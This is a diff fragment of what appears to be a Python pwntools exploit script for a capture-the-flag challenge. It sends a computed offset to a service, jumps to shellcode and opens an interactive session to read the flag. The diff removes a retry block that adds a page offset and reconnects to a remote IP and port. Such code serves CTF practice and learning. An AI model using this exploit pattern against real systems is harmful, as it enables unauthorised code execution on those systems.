@@ -73,14 +73,3 @@ io.send(str(binDif)+'\n')
 # cat that flag!
 io.interactive()
 io.close()
-
-# Retry with a 17 page offset instead of 16
-if (! LOCAL):
-    binDif += 0x1000
-    io = remote('54.202.7.144', 6969)
-    # Jump to shellcode
-    print 'Jumping to: ' + hex(binDif)
-    io.send('j\n')
-    print io.recvuntil('sz? ')
-    io.send(str(binDif)+'\n')
-    io.interactive()
